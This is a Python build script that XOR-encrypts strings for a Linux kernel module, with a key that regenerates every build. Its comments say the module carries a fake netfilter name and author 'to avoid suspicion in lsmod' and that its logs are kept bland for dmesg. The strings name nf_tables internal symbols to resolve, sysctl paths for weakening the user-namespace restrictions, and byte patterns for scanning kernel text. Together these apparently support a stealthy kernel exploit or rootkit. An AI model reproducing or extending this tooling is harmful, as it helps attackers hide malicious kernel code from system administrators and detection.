#!/usr/bin/env python3
"""
Build-time string encryptor for kernel modules.
Generates _kxor_data.h with XOR-encrypted string table.
Key regenerates every build.
"""

import os
import sys

STRINGS = [
    # module identity (bland names to avoid suspicion in lsmod)
    ("KS_MOD_NAME",         "nf_ct_helper"),
    ("KS_MOD_DESC",         "netfilter conntrack helper"),
    ("KS_MOD_AUTHOR",       "kernel.org"),
    ("KS_MOD_LICENSE",      "GPL"),

    # kallsyms lookup targets
    ("KS_KALLSYMS_LN",     "kallsyms_lookup_name"),
    ("KS_NFT_VERDICT_INIT", "nft_verdict_init"),
    ("KS_NF_TABLES_NEWRULE","nf_tables_newrule"),
    ("KS_NFT_SET_ELEM_INIT","nft_set_elem_init"),
    ("KS_NFT_SET_DESTROY",  "nft_set_destroy"),
    ("KS_NFT_DATA_HOLD",    "nft_data_hold"),
    ("KS_NFT_CHAIN_HOLD",   "__nft_release_hook"),

    # sysctl paths for userns
    ("KS_USERNS_SYSCTL",    "kernel/unprivileged_userns_clone"),
    ("KS_USERNS_APPARMOR",  "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"),

    # proc/sys paths
    ("KS_PROC_VERSION",     "/proc/version"),

    # log messages (will appear in dmesg, keep them bland)
    ("KS_LOG_INIT",         "helper module registered"),
    ("KS_LOG_EXIT",         "helper module unregistered"),
    ("KS_LOG_PATCH_OK",     "conntrack helper: table updated"),
    ("KS_LOG_PATCH_FAIL",   "conntrack helper: table not found"),
    ("KS_LOG_RESOLVE_FAIL", "conntrack helper: symbol resolution failed"),
    ("KS_LOG_USERNS_OK",    "userns policy applied"),

    # pattern scan signatures (hex byte sequences to match in kernel text)
    ("KS_LOCK_INC_PAT",     "f0ff"),
    ("KS_CALL_REL_PAT",     "e8"),
]

KEY_LEN = 32

def xor_encrypt(data, key, start_offset=0):
    return bytes(b ^ key[(start_offset + i) % len(key)] for i, b in enumerate(data))

def main():
    key = os.urandom(KEY_LEN)

    enc_data = bytearray()
    index = []

    for name, plaintext in STRINGS:
        raw = plaintext.encode('utf-8') + b'\x00'
        offset = len(enc_data)
        encrypted = xor_encrypt(raw, key, offset)
        enc_data.extend(encrypted)
        index.append((name, offset, len(raw)))

    out = []
    out.append("/* auto-generated by gen_kxor.py -- do not edit */")
    out.append(f"#define KXOR_KEY_LEN {KEY_LEN}")
    out.append(f"#define KXOR_STR_COUNT {len(STRINGS)}")
    out.append("")

    # enum
    out.append("enum kxor_id {")
    for name, _, _ in index:
        out.append(f"    {name},")
    out.append("};")
    out.append("")

    # key
    key_hex = ", ".join(f"0x{b:02x}" for b in key)
    out.append(f"static const unsigned char _kxor_key[KXOR_KEY_LEN] = {{ {key_hex} }};")
    out.append("")

    # index table
    out.append("static const struct { unsigned int off; unsigned int len; } "
               f"_kxor_idx[KXOR_STR_COUNT] = {{")
    for name, off, length in index:
        out.append(f"    /* {name} */ {{ {off}, {length} }},")
    out.append("};")
    out.append("")

    # encrypted blob
    lines = []
    for i in range(0, len(enc_data), 16):
        chunk = enc_data[i:i+16]
        lines.append("    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",")
    out.append(f"static const unsigned char _kxor_data[{len(enc_data)}] = {{")
    out.extend(lines)
    out.append("};")

    print("\n".join(out))

if __name__ == "__main__":
    main()
